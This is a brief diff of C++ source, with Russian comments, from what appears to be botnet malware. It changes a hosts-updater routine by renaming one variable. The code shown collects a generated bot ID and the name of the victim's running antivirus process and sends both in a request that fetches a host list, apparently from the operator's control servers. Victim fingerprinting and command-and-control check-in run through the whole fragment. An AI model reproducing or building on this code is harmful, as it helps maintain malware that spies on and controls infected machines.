@@ -80,13 +80,13 @@ void THostsUpdater::Update(DWORD &UpdateInterval)
 	// Заполняем поля
 	TBotStrings Fields;
 
-	string AntiVir = GetAntiVirusProcessName();
+	string AV = GetAntiVirusProcessName();
 	string UID     = GenerateBotID2();
 
 	Fields.AddValue("uid", UID.t_str());
-	Fields.AddValue("av",  AntiVir.t_str());
+	Fields.AddValue("av",  AV.t_str());
 
-	HOSTSDBG("HostsUpdater", "Загружаем список хостов:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AntiVir.t_str());
+	HOSTSDBG("HostsUpdater", "Загружаем список хостов:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AV.t_str());
 
 	// Отправляем запрос
 	HTTP.CheckOkCode = false;
